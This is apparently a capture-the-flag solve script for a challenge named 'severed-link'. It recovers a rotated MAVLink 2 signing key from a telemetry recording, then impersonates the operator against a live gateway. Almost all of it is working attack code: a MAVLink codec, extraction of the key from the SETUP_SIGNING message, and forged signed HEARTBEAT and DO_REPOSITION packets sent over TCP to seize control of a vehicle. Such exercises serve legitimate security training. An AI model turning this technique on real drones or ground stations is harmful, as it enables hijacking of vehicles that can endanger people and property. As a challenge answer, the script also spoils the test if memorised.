#!/usr/bin/env python3
"""severed-link: pull the rotated MAVLink 2 signing key from the recording, then
authenticate as the operator against the live uplink gateway.

Usage: python3 -I solve.py ../files/mission.tlog <host> <port>

Step 1 only reads the recording (never executes it). Step 2 opens a plain TCP
connection to the live gateway and speaks MAVLink 2 to it -- that is the
challenge itself ("show that an outsider can take the operator's place").
"""
import datetime
import socket
import struct
import sys
import time

EPOCH_2015 = datetime.datetime(2015, 1, 1, tzinfo=datetime.timezone.utc)
X25_INIT = 0xFFFF


# ---------------------------------------------------------------- MAVLink 2 codec
def x25crc(buf, crc=X25_INIT):
    for b in buf:
        tmp = b ^ (crc & 0xFF)
        tmp = (tmp ^ (tmp << 4)) & 0xFF
        crc = ((crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)) & 0xFFFF
    return crc


def pack_v2(sysid, compid, seq, msgid, payload, crc_extra, sign_key=None, link_id=0, timestamp=None):
    header = struct.pack("<BBBBBB", len(payload), 0x01 if sign_key else 0x00, 0, seq, sysid, compid)
    header += struct.pack("<I", msgid)[:3]
    pkt = b"\xFD" + header + payload
    crc = x25crc(bytes([crc_extra]), x25crc(pkt[1:]))
    pkt += struct.pack("<H", crc)
    if sign_key is not None:
        import hashlib
        sig_hdr = bytes([link_id]) + timestamp.to_bytes(6, "little")
        pkt += sig_hdr + hashlib.sha256(sign_key + pkt + sig_hdr).digest()[:6]
    return pkt


def parse_one(buf, i):
    if buf[i] != 0xFD:
        return None
    length, incompat = buf[i + 1], buf[i + 2]
    seq, sysid, compid = buf[i + 4], buf[i + 5], buf[i + 6]
    msgid = buf[i + 7] | (buf[i + 8] << 8) | (buf[i + 9] << 16)
    payload = buf[i + 10:i + 10 + length]
    end = i + 10 + length + 2
    sig = buf[end:end + 13] if incompat & 0x01 else None
    if sig:
        end += 13
    return dict(seq=seq, sysid=sysid, compid=compid, msgid=msgid, payload=payload, sig=sig, end=end - i)


def mav_timestamp():
    """10-microsecond ticks since 2015-01-01T00:00:00Z: the MAVLink 2 signing clock."""
    return int((datetime.datetime.now(datetime.timezone.utc) - EPOCH_2015).total_seconds() * 1_000_000 / 10)


# ---------------------------------------------------------------- 1. recover the rotated key
def find_rotated_key(tlog_path):
    d = open(tlog_path, "rb").read()
    i = 0
    reposition = None                                       # a real accepted DO_REPOSITION, for its coordinates
    key = None
    while i < len(d):
        i += 8                                              # 8-byte big-endian wall-clock prefix in a .tlog
        m = parse_one(d, i)
        if m is None:
            break
        if m["msgid"] == 256:                                # SETUP_SIGNING: target_system/component(2) dropped
            ts, tsys, tcomp = struct.unpack("<Q", m["payload"][0:8])[0], m["payload"][8], m["payload"][9]
            key = m["payload"][10:42]
            print(f"SETUP_SIGNING -> new key for sysid {tsys}, baseline timestamp {ts}", file=sys.stderr)
        if m["msgid"] == 75 and reposition is None:          # COMMAND_INT, padded back to its full 35 bytes
            p = m["payload"] + b"\x00" * (35 - len(m["payload"]))
            param1, param2, param3, param4, x, y, z = struct.unpack("<ffffiif", p[:28])
            command = struct.unpack("<H", p[28:30])[0]
            if command == 192:                                # MAV_CMD_DO_REPOSITION
                reposition = (param1, param2, param3, param4, x, y, z)
        i += m["end"]
    assert key is not None, "no SETUP_SIGNING message found in the recording"
    assert reposition is not None, "no DO_REPOSITION example found in the recording"
    return key, reposition


# ---------------------------------------------------------------- 2. authenticate against the live gateway
def exploit(key, reposition, host, port):
    s = socket.create_connection((host, port), timeout=10)

    def recv_all(t=3):
        s.settimeout(t)
        buf, end = b"", time.time() + t
        while time.time() < end:
            try:
                chunk = s.recv(8192)
                if not chunk:
                    break
                buf += chunk
            except socket.timeout:
                continue
        return buf

    print("banner:", recv_all(), file=sys.stderr)

    # the gateway refuses any command before it has seen a signed HEARTBEAT on the link
    hb = struct.pack("<IBBBBB", 0, 6, 0, 0, 4, 3)
    s.sendall(pack_v2(255, 190, 10, 0, hb, 50, sign_key=key, timestamp=mav_timestamp()))
    recv_all()

    param1, param2, param3, param4, x, y, z = reposition
    payload = struct.pack("<ffffiif", param1, param2, param3, param4, x, y, z)
    payload += struct.pack("<H", 192)                          # MAV_CMD_DO_REPOSITION
    payload += bytes([1, 1, 5, 0, 0])                          # target sysid/compid, frame GLOBAL_INT, current, autocontinue
    s.sendall(pack_v2(255, 190, 11, 75, payload, 158, sign_key=key, timestamp=mav_timestamp()))
    print(recv_all(5).decode("latin1"))
    s.close()


if __name__ == "__main__":
    tlog_path, host, port = sys.argv[1], sys.argv[2], int(sys.argv[3])
    key, reposition = find_rotated_key(tlog_path)
    print("recovered key:", key.hex(), file=sys.stderr)
    exploit(key, reposition, host, port)
